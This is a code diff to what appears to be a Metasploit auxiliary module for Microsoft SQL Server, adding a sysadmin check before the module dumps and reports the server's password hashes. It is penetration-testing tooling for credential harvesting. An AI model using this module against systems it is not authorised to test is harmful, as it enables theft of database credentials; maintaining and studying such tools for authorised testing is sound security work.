@@ -66,6 +66,12 @@ class Metasploit3 < Msf::Auxiliary
     }
     login_data.merge!(service_data)
 
+    is_sysadmin = mssql_query(mssql_is_sysadmin())[:rows][0][0]
+
+    unless is_sysadmin == 0
+      login_data[:access_level] = 'admin'
+    end
+
     create_credential_login(login_data)
 
     #Grabs the Instance Name and Version of MSSQL(2k,2k5,2k8)
@@ -74,11 +80,12 @@ class Metasploit3 < Msf::Auxiliary
     version = mssql_query(mssql_sql_info())[:rows][0][0]
     version_year = version.split('-')[0].slice(/\d\d\d\d/)
 
-    mssql_hashes = mssql_hashdump(version_year)
-    unless mssql_hashes.nil?
-      report_hashes(mssql_hashes,version_year)
+    unless is_sysadmin == 0
+      mssql_hashes = mssql_hashdump(version_year)
+      unless mssql_hashes.nil?
+        report_hashes(mssql_hashes,version_year)
+      end
     end
-
   end
 
 
